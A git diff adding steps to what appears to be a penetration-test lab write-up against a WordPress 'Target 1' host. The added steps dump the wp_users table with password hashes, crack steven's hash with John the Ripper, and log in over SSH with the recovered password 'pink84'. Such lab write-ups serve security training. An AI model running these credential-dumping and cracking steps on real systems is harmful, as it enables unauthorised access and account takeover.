@@ -136,4 +136,29 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     > Command: `select * from wp_posts;`
       
     ![flag3_and_4](../images/flag3_and_4.JPG)
-        
+    
+  - I navigated through the database and accessed the database entry entitled `wp_users`
+  
+  ![wp_user](../images/wp_userhashes.JPG)
+    
+    
+| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+|----|------------|------------------------------------|---------------|-------------------|----------|---------------------|---------------------|-------------|----------------|
+| 1  | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     | 0           | michael        |
+| 2  | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     | 0           | Steven Seagull |
+  
+  - I copied the user hashes onto the kali machine
+    > Command: `touch wp_userhashes.txt`
+    > Command: `vim wp_userhashes.txt`
+    
+  - Then I used `John` to crack `steven`'s hash to gain root access
+    > Command: `john wp_userhashes.txt`
+  
+  ![john_hashcrack](../images/john_hashcrack.JPG)
+  ![john_stevenpassword](../images/john_stevenpassword.JPG)
+  
+- After obtaining steven's password of `pink84` I gained root access via ssh
+  > Command: `ssh steven@192.168.1.110`
+  > Password: `pink84`
+
+![steven_root](../images/steven_root.JPG)
